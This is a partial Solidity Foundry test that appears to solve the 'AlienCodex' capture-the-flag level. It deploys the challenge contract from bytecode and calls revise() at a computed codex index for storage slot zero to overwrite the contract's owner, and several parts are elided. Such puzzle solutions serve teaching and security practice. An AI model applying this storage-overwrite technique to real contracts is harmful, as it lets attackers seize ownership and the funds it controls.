...
contract AlienCodexTest is Test {
    ...
    function test_isSolved() public {
        ...
        bytes memory alienCodexBytesCode = abi.encodePacked(vm.getCode("./src-0_5_x/19_AlienCodex.json"));

        address alienCodexChallenge;

        assembly {
            alienCodexChallenge := create(0, add(alienCodexBytesCode, 0x20), mload(alienCodexBytesCode))
        }
        ...
        (bool success3,) = alienCodexChallenge.call(
            abi.encodeWithSignature("revise(uint256,bytes32)", codexIndexForSlotZero, newOwner)
        );
        require(success3);

        (bool success4, bytes memory data) = alienCodexChallenge.call(abi.encodeWithSignature("owner()"));
        require(success4);
